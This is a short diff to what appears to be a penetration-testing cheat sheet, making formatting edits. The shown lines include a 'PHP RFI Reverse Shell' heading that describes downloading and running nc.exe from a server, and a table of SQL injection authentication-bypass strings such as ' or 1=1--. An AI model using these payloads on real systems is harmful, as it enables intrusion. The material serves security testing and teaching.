@@ -977,7 +977,7 @@ done
 fi</p></td>
 ```
 
-<span id="anchor-108"></span>PHP RFI Reverse Shell
+<span id="anchor-108"></span>PHP RFI Reverse Shell</span>
 
 This can be used in a RFI/LFI to download nc.exe from the specified
 server then run it.
@@ -1023,7 +1023,6 @@ could lead to type juggling.
 | 'or a=a-   | "or a=a-   | or 'a'='a'  | 'or 'a'='a' | "or 'a'='a' | ')or('a'='a' |
 | ")"a"="a"  | ')'a'='a   | 'or"='      | ' or 1=1--  | " or 1=1--  | or 1=1--     |
 | " or 1=1\# |            |             |             |             |             
-```
 
 <span id="anchor-114"></span>SQL Comment Formats
 
